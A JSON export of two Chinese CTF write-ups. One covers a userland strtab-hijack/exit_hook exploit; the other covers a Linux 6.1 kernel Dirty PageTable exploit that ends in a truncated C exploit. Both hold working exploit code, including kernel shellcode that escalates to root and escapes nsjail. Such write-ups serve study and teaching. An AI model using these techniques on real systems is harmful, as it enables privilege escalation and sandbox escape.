[{"title":"[strtab劫持] 2024巅峰极客 easyblind","url":"/2024/09/30/strtab%E5%8A%AB%E6%8C%81-2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-easyblind/","content":"2024巅峰极客Easyblind前置1.需要有ret2dlresolve的基础知识\n2.该题第一步如何实现loop，在C0Lin师傅的博客中有分析这里就不细讲了。\n3.对exit_hook有基本了解\n关于link_map的strtab劫持首先看，通过ret2dlresolve可以知道延迟绑定，需要通过_dl_fixup函数：\n_dl_fixup (# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS\t   ELF_MACHINE_RUNTIME_FIXUP_ARGS,# endif\t   struct link_map *l, ElfW(Word) reloc_arg)&#123;  const ElfW(Sym) *const symtab    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);// 获取符号表地址  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);// 获取字符串表地址  ...\n\n主要看strtab是如何获取地址的，D_PTR (l, l_info[DT_STRTAB])展开后是((l)-&gt;l_info[5]-&gt;d_un.d_ptr + (dl_relocate_ld (l) ? 0 : (l)-&gt;l_addr))，本质就是通过link_map保存的指向dynamic结构体：\ntypedef struct&#123;  Elf64_Sxword\td_tag;\t\t\t/* Dynamic entry type */  union    &#123;      Elf64_Xword d_val;\t\t/* Integer value */      Elf64_Addr d_ptr;\t\t\t/* Address value */    &#125; d_un;&#125; Elf64_Dyn;\n\nd_ptr保存的就是指向strtab的地址，读取的汇编代码如下：\n&lt;_dl_fixup+49&gt; mov rcx, qword ptr [rbx + 0x68]// rbx就是指向的link_map的地址&lt;_dl_fixup+56&gt; add rdi, qword ptr [rcx + 8]// rcx就是指向保存strtab的dynamic结构体\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t// [rcx+8]就是取出strtab\n\n那么只要修改link_map+0x68指向的地址到可控地址，下次延迟绑定时就可以任意libc函数执行了。一般就是修改其后几位使其指向bss段上面的可控地址，或者用写入heap地址，然后将可控地址的偏移为st_name的地方写上想要执行函数的字符串即可。\n对于该题我们每一次循环可以任意修改一字节libc和ld可写段的内容，因此link_map+0x68是可以成功修改的，同时根据改题正常想法会去修改link_map+0x68保存的地址为执行bss段上保存malloc的chunk的地址-8，这样strtab就是执行题目申请的那个地址了。\n但是如下面数据所示0x5621e5e41e78为link_map+0x68保存的地址，0x5621e5e41e80保存的是strtab的地址，而malloc的地址保存在0x5621e5e42050，同0x5621e5e41e78相差大于一个字节，题目一次修改则只能改一次字节，每次都要经过延迟绑定，必定会报错退出。在细看下面数据0x5621e5e41ec0指向的0x7ff3f2d75160是在libc空间附近的地址，这个东西就是dyn里的_r_debug，因此我们可以将link_map+0x68保存的地址0x5621e5e41e78最后一个字节改成b8，将strtab劫持到0x7ff3f2d75160上，且此地址里的内容可以为本题修改。\n00:0000│  0x5621e5e41e78 ◂— 0x501:0008│  0x5621e5e41e80 —▸ 0x5621e5e43000 ◂— 0x6f732e6362696c0002:0010│  0x5621e5e41e88 ◂— 0x603:0018│  0x5621e5e41e90 —▸ 0x5621e5e43110 ◂— 0x004:0020│  0x5621e5e41e98 ◂— 0xa /* &#x27;\\n&#x27; */05:0028│  0x5621e5e41ea0 ◂— 0x10906:0030│  0x5621e5e41ea8 ◂— 0xb /* &#x27;\\x0b&#x27; */07:0038│  0x5621e5e41eb0 ◂— 0x1808:0040│  0x5621e5e41eb8 ◂— 0x1509:0048│  0x5621e5e41ec0 —▸ 0x7ff3f2d75160 (_r_debug) ◂— 0x10a:0050│  0x5621e5e41ec8 ◂— 0x30b:0058│  0x5621e5e41ed0 —▸ 0x5621e5e42000 ◂— 0x3df8\n\n通过上面的方法对0x7ff3f2d75160+st_name(该题的write的st_name为62)地址写函数字符串则可以实现任意libc函数的执行\n正常解析过程为:\n劫持后的解析过程:\n即便能任意执行system，但是rdi不可控，所以只能另外想办法，同时该题泄露地址困难，题目没有像其他正常题目会进行setbuf，所以的IO_file里的各个指针都未初始化，即便执行putchar，使得指针初始化，指向的地址是也是heap段上，所以泄露困难。\n该题需要注意的是write字符串篇偏移是62，而_r_debug+62刚好指向了link_map:main的l_name+6，如果写字符串则会修改l_name和l_ld，但是这两个东西并不会影响到延迟绑定程序。下面数据中0x7fa2d9c11190是link_map，加8则是l_name。\npwndbg&gt; telescope 0x7fa2d9c1119000:0000│       0x7fa2d9c11190 —▸ 0x558449dc2018 ◂— 0x10c001:0008│ r10-6 0x7fa2d9c11198 ◂— 0x78657fa2d9c1173002:0010│       0x7fa2d9c111a0 ◂— 0x558449007469 /* &#x27;it&#x27; */03:0018│       0x7fa2d9c111a8 —▸ 0x7fa2d9c11740 —▸ 0x7fffd33b9000 ◂— jg 0x7fffd33b904704:0020│       0x7fa2d9c111b0 ◂— 0x005:0028│       0x7fa2d9c111b8 —▸ 0x7fa2d9c11190 —▸ 0x558449dc2018 ◂— 0x10c006:0030│       0x7fa2d9c111c0 ◂— 0x007:0038│       0x7fa2d9c111c8 —▸ 0x7fa2d9c11718 —▸ 0x7fa2d9c11730 ◂— 0x0\n\n\n\nexit_hook参考了当时唯一解Tplus师傅的wp，师傅用的方法是利用exit_hook。\n\n调试exit_hook需要找到_rtld_global的地址，以及对应的偏移地址，题目只给libc和ld，不好找，非常建议使用cpwn一键帮你配好调试的symblos和源码，用过的都说好。\n\nexit_hook主要是利用这两个函数\n_dl_rtld_lock_recursive = 0x7fda65ae3150 &lt;rtld_lock_default_lock_recursive&gt;,  _dl_rtld_unlock_recursive = 0x7fda65ae3160 &lt;rtld_lock_default_unlock_recursive&gt;,\n\n此刻的system地址为0x7fda65940290，有6位不同后三位固定不用爆破，前3位需要爆破，则成功率为1&#x2F;(16*16*16)即1&#x2F;4096。因此这题特地给了个map.txt就是不想你爆破太久。\n在libc2.31环境下_dl_rtld_lock_recursive地址为_rtld_global+3848，与ld可写段偏移为0xf68\n同时rdi指向的是_rtld_global+2312与ld可写段偏移为0x968\n该题payload的数据是固定的，搞出payload一次性输出即可，减少交互次数。\nexp:\n#!/usr/bin/env python3from pwn import *#context.log_level = &quot;debug&quot;p_addr = lambda name, addr : print(f&#x27;&#123;name&#125;: &#123;hex(addr)&#125;&#x27;)ru=lambda s :p.recvuntil(s)rut=lambda s,t :p.recvuntil(s,timeout=t)r=lambda n :p.recv(n)sla=lambda d,b:p.sendlineafter(d,b)sa=lambda d,b:p.sendafter(d,b)sl=lambda s :p.sendline(s)                                  sls=lambda s :p.sendline(str(s).encode())ss=lambda s :p.send(str(s).encode())s=lambda s :p.send(s)uu64=lambda data :u64(data.ljust(8,b&#x27;\\x00&#x27;))it=lambda :p.interactive()def write_one(addr, data):    tmp = b&quot;&quot;    for i in range(len(data)):        tmp += (p64(addr+i)+p8(data[i]))       return tmpp = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;, 29129)ld = 0x265000 - 0x10#ld = 0x26b000 - 0x10link_base_addr = ld + 0x1190link_dyn_str = link_base_addr + 0x68fake_str = ld + 0x1160exit_hook = ld + 0xf68exit_hook_rdi = ld + 0x968write_st_name = 62payload = b&quot;&quot;payload+= (p64(link_base_addr)+p8(0x18))str_ = b&quot;\\x90\\x62\\xb6&quot;#str_ = b&quot;\\x90\\x72\\xe2&quot;payload+= write_one(exit_hook, str_)str_ = b&quot;/bin/sh\\x00&quot;payload+= write_one(exit_hook_rdi, str_)str_ = b&quot;exit\\x00&quot;payload+= write_one(fake_str+write_st_name, str_)payload+= (p64(link_dyn_str)+p8(0xb8))count = 0while (True):    try:        p = process(&quot;./pwn&quot;)        s(payload)        sl(b&quot;echo ok&quot;)        p.recvuntil(b&quot;ok&quot;)        sl(b&quot;cat /flag&quot;)        p.interactive()        break    except Exception as e:        p.close()        count+=1        print(count)        continueit()\n\n\n\n","categories":["ctf","wp"],"tags":["link_map劫持"]},{"title":"Dirty PageTable-2024 N1CTF pwn_heap_master","url":"/2024/11/17/Dirty-PageTable-2024-N1CTF-pwn-heap-master/","content":"2024 N1CTF pwn_heap_master前置\n对cross-cache attack有基本了解\n本文很多是参考这两位师傅的文章(bsauce&amp;henry)，但有些地方会做更详细的介绍\n同时本文直接将dirtypagetable具体手法细节与题目结合起来讲\n本人是赛棍，正式学习内核没多久，有错误的地方希望师傅提出建议\n\n关于Dirty PageTable通过目标存在的double-free&#x2F;OOB&#x2F;uaf漏洞转化为对用户页表pte的控制，结合用户态程序可以实现任意物理地址写和读，由于是data-only的手法，可以绕过现有的基本保护和实现逃逸，且正常情况下成功率极高。\n分析题目题目配置\n题目链接pwn_heap_master\n\n题目的内核版本是6.1.110，算是较高的版本了\n\n同时该题目在启动内核后，运行根目录startjail，进入nsjail，因此该题目的目标是实现nsjail逃逸，而且会加载在/etc/nsjail/nsjail.conf的配置文件\n#!/bin/shulimit -Hn 33000/bin/nsjail --config /etc/nsjail/nsjail.confecho &quot;Bye&quot;\n\n对于配置文件重点关注挂载了什么，以及禁用了哪些系统调用\n可以明显看见挂载了/dev/safenote以及/dev/dma_heap，通过挂载了&#x2F;dev&#x2F;dma_heap已经明显告诉你本题可以用dirty pagetable的手法，而且拿着dma_heap这个显眼的东西去bing查找大概率会查到dirty pagetable相关的文章\nmount: [  &#123;    src: &quot;/bin&quot;    dst: &quot;/bin&quot;    is_bind: true    nosuid: true    rw: false  &#125;,  &#123;    src: &quot;/dev/dma_heap&quot;    dst: &quot;/dev/dma_heap&quot;    is_bind: true    nosuid: true    rw: true  &#125;,  &#123;    src: &quot;/dev/safenote&quot;    dst: &quot;/dev/safenote&quot;    is_bind: true    nosuid: true    rw: true  &#125;,  &#123;    src: &quot;/dev/null&quot;    dst: &quot;/dev/null&quot;    is_bind: true    nosuid: true    rw: true  &#125;,  &#123;    src: &quot;/dev/zero&quot;    dst: &quot;/dev/zero&quot;    is_bind: true    nosuid: true    rw: true  &#125;,  &#123;    src: &quot;/dev/random&quot;    dst: &quot;/dev/random&quot;    is_bind: true    nosuid: true    rw: true  &#125;,  &#123;    src: &quot;/dev/urandom&quot;    dst: &quot;/dev/urandom&quot;    is_bind: true    nosuid: true    rw: true  &#125;,  &#123;    dst: &quot;tmp&quot;    fstype: &quot;tmpfs&quot;    rw: true  &#125;,  &#123;    dst: &quot;/proc&quot;    fstype: &quot;proc&quot;    rw: true  &#125;,]\n\n对于禁用的了系统调用，平时内核题所用的系统调用基本被禁用了，什么msg_msg，keyctl，等等都不能用了，pipe倒是还能用。\n\n由于启用了nsjail，可以在nsjail.conf文件的mount部分添加一条这个方便把exp导入nsjail中\n&#123; src: &quot;/exp&quot; dst: &quot;/exp&quot; is_bind: true nosuid: true rw: true&#125;\n\n\n\n目标驱动在初始化驱动时，会创建一个名为safenote大小为192独立kmem_cache,且flags: 0x4052000 (SLAB_ACCOUNT | SLAB_PANIC | SLAB_STORE_USER | SLAB_HWCACHE_ALIGN)存在SLAB_ACCOUNT因此不会和原有的kmem_cache合并。\n在创建成功后还进行了一波神秘的操作，其具体功能后面再说。\nint __cdecl safenote_init()&#123;  int v0; // r12d  __int64 v1; // rax  unsigned int v2; // esi  _fentry__();  v0 = misc_register(&amp;safenote_device);  if ( v0 )  &#123;    printk(&amp;unk_2B1);  &#125;  else  &#123;    v1 = kmem_cache_create(&quot;safenote&quot;, 192LL, 0LL, 0x4052000LL, 0LL);    note_kcache = (kmem_cache *)v1;    if ( v1 )    &#123;      v2 = *(unsigned __int16 *)(v1 + 52);      *(_DWORD *)(v1 + 44) = 52;      *(_DWORD *)(v1 + 48) = (v2 + 103) / v2;    &#125;    else    &#123;      v0 = -12;      printk(&amp;unk_308);    &#125;  &#125;  return v0;&#125;\n\n然后是分析基本操作，本题只有ioctl有可用的操作\nioctl维护着一个堆指针的表\n功能一：能够从safenote上面申请一个chunk，且保存在用户指定idx对应表里，最多可以同时申请0x100个\n功能二：能够释放用户指定idx对应表里的地址，且清空地址\n功能三：能够有一次机会释放用户指定idx对应表里的地址，但不清空地址\n很明显的double free+cross-cache attack\n__int64 __fastcall safenote_ioctl(file *f, unsigned int cmd, unsigned __int64 arg)&#123;  __int64 v3; // rdx  __int64 result; // rax  u_int32_t heap_idx; // edx  _fentry__();  if ( copy_from_user(&amp;ioc_arg, v3, 4LL) )    return -14LL;  if ( cmd == 4920 )  &#123;    if ( ioc_arg.heap_idx &lt;= 0xFF )    &#123;      if ( !note[ioc_arg.heap_idx] )        return 0LL;      kfree();      note[ioc_arg.heap_idx] = 0LL;      return 0LL;    &#125;    return -22LL;  &#125;  if ( cmd == 4921 )  &#123;    if ( !backdoor_used &amp;&amp; ioc_arg.heap_idx &lt;= 0xFF )    &#123;      if ( !note[ioc_arg.heap_idx] )        return 0LL;      kfree();      result = 0LL;      backdoor_used = 1;      return result;    &#125;    return -22LL;  &#125;  result = -22LL;  if ( cmd == 4919 )  &#123;    heap_idx = ioc_arg.heap_idx;    if ( ioc_arg.heap_idx &lt;= 0xFF &amp;&amp; !note[ioc_arg.heap_idx] )    &#123;      note[heap_idx] = (char *)kmem_cache_alloc(note_kcache, 0x400CC0LL);      if ( note[ioc_arg.heap_idx] )        return 0LL;      return -12LL;    &#125;  &#125;  return result;&#125;\n\n神秘操作可以从代码很明显的看出是对kmem_cache对应结构体作出了一些修改，我们可以直接利用cat /proc/slabinfo查看safenote和正常的kmalloc-192有什么区别\n\n或者用gef-kernel里面所带的指令slub-dump来查看\ngef-kernel非常建议使用，不像pwndbg的slab指令没有完整的symbols就不能使用，gef-kernel应该是使用了搜索内存的方式直接dump出来，非常方便，除此之外还有很多好用的指令，比如p2v，v2p实现虚拟地址和物理地址的转化，在这题就非常好用\n\n可以从图中看出safenotechunk大小是0x100，而正常kmalloc-192chunk大小是0xc0，所以可以确定神秘操作在干啥了\n\n而将0xc0改成0x100有什么用呢，这里就是进一步告诉你使用file UAF，因为对于file结构体大小，申请的chunk大小也是0x100，利用上面的double-free可以很容易的实现file UAF\nstruct file &#123;\tunion &#123;\t\tstruct llist_node  f_llist;              /*     0     8 */\t\tstruct callback_head f_rcuhead;          /*     0    16 */\t\tunsigned int       f_iocb_flags;         /*     0     4 */\t&#125;;                                               /*     0    16 */\tstruct path                f_path;               /*    16    16 */\tstruct inode *             f_inode;              /*    32     8 */\tconst struct file_operations  * f_op;            /*    40     8 */\tspinlock_t                 f_lock;               /*    48     4 */\t/* XXX 4 bytes hole, try to pack */\tatomic_long_t              f_count;              /*    56     8 */\t/* --- cacheline 1 boundary (64 bytes) --- */\tunsigned int               f_flags;              /*    64     4 */\tfmode_t                    f_mode;               /*    68     4 */\tstruct mutex               f_pos_lock;           /*    72    32 */\tloff_t                     f_pos;                /*   104     8 */\tstruct fown_struct         f_owner;              /*   112    32 */\t/* --- cacheline 2 boundary (128 bytes) was 16 bytes ago --- */\tconst struct cred  *       f_cred;               /*   144     8 */\tstruct file_ra_state       f_ra;                 /*   152    32 */\tu64                        f_version;            /*   184     8 */\t/* --- cacheline 3 boundary (192 bytes) --- */\tvoid *                     f_security;           /*   192     8 */\tvoid *                     private_data;         /*   200     8 */\tstruct hlist_head *        f_ep;                 /*   208     8 */\tstruct address_space *     f_mapping;            /*   216     8 */\terrseq_t                   f_wb_err;             /*   224     4 */\terrseq_t                   f_sb_err;             /*   228     4 */\t/* size: 232, cachelines: 4, members: 20 */\t/* sum members: 228, holes: 1, sum holes: 4 */\t/* last cacheline: 40 bytes */&#125;;\n\n漏洞利用对于file UAF，很容易就能想到dirty cred来实现仅可读文件覆写，但是一方面对于该题的linux版本dirty cred能否还可以使用存在疑问，另一方面要实现逃逸只能去修改主机挂载过来的&#x2F;bin文件夹(可能&#x2F;proc下也有能用的)，然后修改退出时执行的echo，可问题在于退出nsjail时，需要先退出exp，如果使用file UAF后退出时资源释放很大概率是会导致崩溃的\n所以使用cross-cache attack+dirty pagetable来实现漏洞利用\n第一步实现file UAF\n如果明白cross-cache attack这一步较为简单，首先是使用safenote直接kmalloc满0x100个chunk，然后全部free，留下一个用于double-free，根据chunk大小为0x100，一个page可以有16个chunk，safenote每次是申请一个slab都是一个page，0x100个chunk就是16个slab，同时该题最大留存的slab数量是4(神秘操作里有个除2操作，应该就是用于减小最大留存的slab数量，提高利用成功率)，如果0x100个chunk全部释放则有12个slab会被释放，即有12个page被释放回buddy system\n然后就是一次性打开大量的同一个任意文件，喷射file结构体，使得之前释放的page立马被再次拿来使用，而且buddy system也是遵循FILO，所以极高概率是申请回之前释放的page。\n喷射完毕后我们使用safenote的free函数，free掉刚才保留的指针，此时有一个file struct被释放了。\n接下来就是确定哪一个fd对应的file结构体被释放了，可以再次喷射大量的另一个文件的file struct，使得之前被释放的file struct被占用，现在循环read之前喷射的fd，如果有不一样的，则是victim fd。\n第二步现在将除了victim fd以外的fd全部close，由于有两个fd指向了同一个file struct，则不需要close victim fd，刚才kmalloc大量的file struct，全部file stuct释放后，大部分的slab对应的page又会回到buddy system中\n接下来就要讲关于dirty pagetable的东西了\n众所周知，每一个用户态进程都有一个对应的页表，通常64位的linux使用的是4级页表\n对应下图从PGD到PUD到PMD再到PTE，PTE就是指向具体物理地址的信息了\n对于每一个页表或者页表目录都是1page大小，即4096byte，每个页表项都是占8字节，则每个page有512个页表项\n\n而对于一个用户态程序，可以看见有许多没有对应的物理地址的虚拟地址，这些虚拟地址我们可以使用mmap函数来映射对应的物理地址，在这些虚拟地址没被映射之前，其对应的页表目录是没有被创建的，显然不可能都创建的如果每个程序都将其的页表目录全部创建，那得占用很大一部分空间。\n如果我们主动去mmap大量的地址则会有大量的1page从buddysystem中被申请出来，用于创建页表\n\n需要注意mmap可以放在exp开始时直接执行，因为只有第一次读写对应mmap地址时，才会触发缺页然后映射对应的物理地址以及可能创建对应的页表项\n\n我们回到上面free掉所有的file struct，则会有大量的1page回到buddysystem中，然后去mmap大量的地址，这些1page又被拉回来使用，而其中有一部分地方是我们的uaf的file struct对应的地方。\n\n在内存中你会发现victim fd对应file struct的内容都是pte\n\n里面最高位的8还有最低的3位867，应该都是一些标志位，去掉这些才是真正的物理地址\n\n\n第三步在此之前我们需要说一个file struct里的count成员(距离file struct开始地址0x38)，他是用来表示当前有多少个引用指向该file结构体\n如果用dup函数来复制victim fd，则会使得count+1，且即便file结构体内容不正常也能正常+1而不崩溃\n如果dup,0x1000次则会使得pte对应的物理地址往下增加0x1000\n\n真是佩服能找到这样一个功能适配dirty pagetable\n但也很容易被修复，如果dup添加一个file struct 完整性验证，这个方法直接不能用了\n而且每个用户态dup次数有限，可通过fork解决\n\n当我们dup,0x1000次后，再次循环遍历之前mmap的地址，如果找到有一个和他本身应该对应的idx不一样的，则是victim page。\n第四步仅用dup也只能增加物理地址，似乎没啥用，有什么办法可以实现控制页表项呢\n可能会想到继续dup，增加物理地址，直到找到包含页表项到page，实则目前是没法实现的\n其实你会注意到一个问题，第二步，创建页表目录后，还有一个个page大小的映射被创建，相对于这一个个page大小的大量映射，之前file struct全部free释放的page似乎是非常少的不够用的，按理来说file struct里被写入pte成功率很低，但是第二步成功率非常高，则就说明了mmap映射的物理地址，和alloc页表目录对应的物理地址应该是来自不同区块的。同时mmap映射的物理地址比alloc页表目录对应的物理地址高。\n匿名 mmap() 分配的物理页来自内存区的MIGRATE_MOVABLE free_area，而用户页表是从内存区的MIGRATE_UNMOVABLE free_area分配，所以很难通过递增PTE使之指向另一用户页表。\n由于内核空间和用户空间需要一些共享物理页，使得两个空间都能访问到，比如dma-heap,io_uring,GPUs等\n所以这里又要介绍另一个东西dma-heap，也是题目中nsjail挂载进来的/dev/dma-heap\n我们可以通过打开/dev/dma-heap/system进行ioctl，分配一定大小的内存，该内存会在MIGRATE_UNMOVABLE free_area分配，而且该内存可以通过mmap映射到用户态空间。\n#define DMA_HEAP_IOCTL_ALLOC 0xc0184800struct dma_heap_allocation_data &#123;  ull len;  unsigned int fd;  unsigned int fd_flags;  ull heap_flags;&#125;;\t\tdma_heap_fd = open(&quot;/dev/dma_heap/system&quot;, O_RDONLY);    if (dma_heap_fd &lt; 0) err_msg(&quot;Fail open dma_heap&quot;);\t\t......\t\tstruct dma_heap_allocation_data data;    data.len = 0x1000;    data.fd_flags = O_RDWR;    data.heap_flags = 0;    data.fd = 0;    if (ioctl(dma_heap_fd, DMA_HEAP_IOCTL_ALLOC, &amp;data) &lt; 0) &#123;        perror(&quot;DMA_HEAP_IOCTL_ALLOC&quot;);        return -1;    &#125;    int dma_buf_fd = data.fd;\n\n因此我们可以将页表目录的喷射改为，先喷射一半，然后进行dma-heap，再将另一半进行喷射\n继续按之前的步骤，我们把victim page 先munmap，然后将dma-heap创建的地址mmap到victim page上面\n\n记得读写，使得dma-heap对应的页创建\n\n\n接下来再次进行多次dup,0x1000次，总有一次会使得victim page中对应的内容是pte\n成功使得victim page里的内容是pte后，就可以开始尝试任意物理地址写读了吗？\n该题目最终目的是实现逃逸，最好的想法就是patch内核的某个函数用户态触发执行实现逃逸，但是在开启aslr后物理地址里保存的text段的起始物理地址也是随机的\n典中典类似page_offset_base+0x9d000保存着text地址，而page_offset_base+0x9c000(因为是直接映射区，对应的是物理地址的0x9c000)保存着物理地址的text地址\n\n感觉既然都可以任意地址读，那也应该可以实现直接从0物理地址开始扫描，直到找到需要的物理地址吧？\n\n接下来就是往victim page[0]写入0x9c000，然后去泄露物理地址的text地址，同时需要注意我们不知道是哪个mmap的地址的物理地址被改写为了0x9c000，所以还要再次进行搜索，得到victim page2\n\n第五步接下来直接模仿henry师傅文章里patch do_symlinkat函数\n\n需要注意关闭kaslr时，0x9c000里保存的物理地址和物理地址的text基地址偏移量，与开启kaslr时不同，所以建议关闭kaslr时物理地址的text基地址直接使用0x1000000，测试成功后在开启kaslr然后调整\n\n接下来就是将shellcode写入do_symlinkat起始地址\n下面是汇编代码，也是直接拿henry师傅文章里的，然后通过nasm 来编译成elf文件，把shellcode提取出来即可\n里面的各个函数偏移，还有sub r15，xxxxx的，还有current-&gt;fs的偏移需要我们修改\n简单解释一下，call a使得当前do_symlinkat的地址被写到栈上，然后pop 给r15，计算text基地址，接下来就是修改当前的进程的cred，nsproxy，fs\n\nshellcode的fs替换是直接通过与指向task_struct偏移量来进行替换的，由于各个版本的fs_struct与task_struct的偏移量不同，所以需要特地计算\n这边给出一个比较简单的方法，就是我们可以给进程取个名字，然后名字会保存在task_struct的成员comm里面，而通常comm成员与fs成员偏移量不变，可以先搜索comm里你指定的字符串，然后借此来计算得到fs与task_struct的偏移量\n\n\ninit_cred equ 0x2a76b00commit_creds equ 0x1c2670find_task_by_vpid equ 0x1b8fa0init_nsproxy equ 0x2a768c0switch_task_namespaces equ 0x1c0ad0init_fs equ 0x2bb5320copy_fs_struct equ 0x45c0f0swapgs_restore_regs_and_return_to_usermode equ 0x14011c6_start:  endbr64  call aa:  pop r15  sub r15, 0x42cc49  ; commit_creds(init_cred) [3]  lea rdi, [r15 + init_cred]  lea rax, [r15 + commit_creds]  call rax  ; task = find_task_by_vpid(1) [4]  mov edi, 1  lea rax, [r15 + find_task_by_vpid]  call rax  ; switch_task_namespaces(task, init_nsproxy) [5]  mov rdi, rax  lea rsi, [r15 + init_nsproxy]  lea rax, [r15 + switch_task_namespaces]  call rax  ; new_fs = copy_fs_struct(init_fs) [6]  lea rdi, [r15 + init_fs]  lea rax, [r15 + copy_fs_struct]  call rax  mov rbx, rax  ; current = find_task_by_vpid(getpid())  mov rdi, 0x1111111111111111   ; will be fixed at runtime  lea rax, [r15 + find_task_by_vpid]  call rax  ; current-&gt;fs = new_fs [8]  mov [rax + 0x828], rbx  ; kpti trampoline [9]  xor eax, eax  mov [rsp+0x00], rax  mov [rsp+0x08], rax  mov rax, 0x2222222222222222   ; win  mov [rsp+0x10], rax  mov rax, 0x3333333333333333   ; cs  mov [rsp+0x18], rax  mov rax, 0x4444444444444444   ; rflags  mov [rsp+0x20], rax  mov rax, 0x5555555555555555   ; stack  mov [rsp+0x28], rax  mov rax, 0x6666666666666666   ; ss  mov [rsp+0x30], rax  lea rax, [r15 + swapgs_restore_regs_and_return_to_usermode]  jmp rax  int3\n\n然后在exp写入内存之前记得将shellcode的一些量比如0x1111111111111111替换为执行需要的值\n接下来就是执行symlink触发shellcode，由于题目启动时使用的是将flag文件挂载为虚拟机的virtio类型的虚拟驱动器，shellcode执行成功后接下来就是读取/dev/vda文件获取flag\nexp:\n#define _GNU_SOURCE#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;#include&lt;unistd.h&gt;#include&lt;fcntl.h&gt;#include&lt;sys/types.h&gt;#include&lt;sys/ioctl.h&gt;#include&lt;sched.h&gt;#include &lt;sys/socket.h&gt;#include&lt;sys/mman.h&gt;#include &lt;sys/prctl.h&gt;#define SOCKET_NUM 8#define SK_BUFF_NUM 128#define ull unsigned long long #define TEXT_MASK 0xffffffff00000000#define CHUNK_MASK 0xffff000000000000#define DMA_HEAP_IOCTL_ALLOC 0xc0184800ull user_cs, user_ss, user_sp, user_rflags;void save_status()&#123;    __asm__(&quot;mov user_cs, cs;&quot;            &quot;mov user_ss, ss;&quot;            &quot;mov user_sp, rsp;&quot;            &quot;pushf;&quot;            &quot;pop user_rflags;&quot;            );    puts(&quot;[*] save success&quot;);&#125;void bind_cpu(int core)&#123;    cpu_set_t cpu_set;    CPU_ZERO(&amp;cpu_set);    CPU_SET(core, &amp;cpu_set);    sched_setaffinity(getpid(), sizeof(cpu_set), &amp;cpu_set);    puts(&quot;[*] bind core success&quot;);&#125;void open_flag()&#123;    puts(&quot;[*] Ready to get root......&quot;);    if(getuid())&#123;        puts(&quot;[*] Failed to get root!&quot;);    &#125;    puts(&quot;[*] Root got!&quot;);    int fd_flag = open(&quot;/flag&quot;, 0);    char flag[100];    read(fd_flag, flag, 100);    puts(flag);    system(&quot;/bin/sh&quot;);    exit(0);&#125;ull dump_mem(void *data, int begin, int len, int get)&#123;    if (len) printf(&quot;%d: &quot;, begin/4);    for (size_t i = begin; i &lt; len; i++)    &#123;           printf(&quot;%016llx &quot;, ((ull*)data)[i]);        if ((i+1) % 4 == 0) printf(&quot;\\n%d: &quot;, (i+1)/4);    &#125;    if (len) printf(&quot;\\n&quot;);    return ((ull*)(data))[get];&#125;int fd;struct ioc_arg&#123;    int idx;&#125; add_arg;void k_add(int idx) &#123;    add_arg.idx = idx;    ioctl(fd, 0x1337, &amp;add_arg);&#125;void k_free(int idx) &#123;    add_arg.idx = idx;    ioctl(fd, 0x1338, &amp;add_arg);&#125;void k_backdoor(int idx) &#123;    add_arg.idx = idx;    ioctl(fd, 0x1339, &amp;add_arg);&#125;struct pipe_buffer &#123;\tstruct page *page;\tunsigned int offset, len;\tconst struct pipe_buf_operations *ops;\tunsigned int flags;\tunsigned long private;&#125;;struct dma_heap_allocation_data &#123;  ull len;  unsigned int fd;  unsigned int fd_flags;  ull heap_flags;&#125;;char buffer[0x2000];#define SPRAY_PIPE_NUM 0xd0#define SPRAY_FILE_NUM 0x100#define SPRAY_PGTABLE_NUM 0x800int pipe_fd[SPRAY_PIPE_NUM][2];int file_fd[SPRAY_FILE_NUM];int tmp_file_fd[SPRAY_FILE_NUM];ull* spray_page[SPRAY_PGTABLE_NUM];ull* victim_page = (ull*)-1;int dma_heap_fd;int victim_idx = -1;ull kbase;struct pipe_buffer info_pipe_buffer;static void win() &#123;  char buf[0x100];  int fd = open(&quot;/dev/vda&quot;, O_RDONLY);  if (fd &lt; 0) &#123;    puts(&quot;[-] Lose...&quot;);  &#125; else &#123;    puts(&quot;[+] Win!&quot;);    read(fd, buf, 0x100);    write(1, buf, 0x100);    puts(&quot;[+] Done&quot;);    pause();  &#125;  exit(0);&#125;void main() &#123;    save_status();    bind_cpu(0);    fd = open(&quot;/dev/safenote&quot;, 2);    if(fd == -1)         puts(&quot;[x] Error opening /dev/safenote&quot;);    ull *rop = (ull*)buffer;    for(int i = 0; i &lt; SPRAY_PIPE_NUM; i++)&#123;        if(pipe(pipe_fd[i]) &lt; 0)            puts(&quot;[x] Error pipe&quot;);    &#125;    puts(&quot;[*] step0 init mmap and dma-heap&quot;);    dma_heap_fd = open(&quot;/dev/dma_heap/system&quot;, O_RDONLY);    if (dma_heap_fd &lt; 0) puts(&quot;Fail open dma_heap&quot;);   for (int i = 0; i &lt; SPRAY_PGTABLE_NUM; i++)&#123;        spray_page[i] = (ull*)mmap((void *)(0xdead0000UL + i*(0x10000UL)),                            0x8000, PROT_READ | PROT_WRITE,                            MAP_ANONYMOUS | MAP_SHARED, -1, 0);        if (spray_page[i] == MAP_FAILED) puts(&quot;fail to mmap space&quot;);        &#125;    puts(&quot;[*] step1 spray chunk and free&quot;);    for(int i = 0; i &lt; 0xff; i++)&#123;        k_add(i);    &#125;    int free_idx = 0x80;    for(int i = 0; i &lt; 0xff; i++)&#123;        if(i == free_idx)&#123;            k_backdoor(i);            continue;        &#125;        k_free(i);    &#125;        puts(&quot;[*] step2 spray file struct and find victim file&quot;);    for(int i = 0; i &lt; SPRAY_FILE_NUM; i++)&#123;        file_fd[i] = open(&quot;/&quot;, O_RDONLY);        if(file_fd[i] == -1)            puts(&quot;[x] Error open file&quot;);    &#125;    k_free(free_idx);    for(int i = 0; i &lt; SPRAY_FILE_NUM; i++)&#123;        tmp_file_fd[i] = open(&quot;/bin/busybox&quot;, O_RDONLY);        if(tmp_file_fd[i] == -1)            puts(&quot;[x] Error open tmp file&quot;);    &#125;    for(int i = 0; i &lt; SPRAY_FILE_NUM; i++)&#123;        int tmp_int = read(file_fd[i], buffer, 0x100);        if(tmp_int != -1)&#123;            victim_idx = i;            printf(&quot;[+] Found victim idx: %d\\n&quot;, i);            break;        &#125;    &#125;    puts(&quot;[*] step3 free all file and spray pagetable, dma-heap&quot;);    for(int i = 0; i &lt; SPRAY_FILE_NUM; i++)&#123;        close(tmp_file_fd[i]);   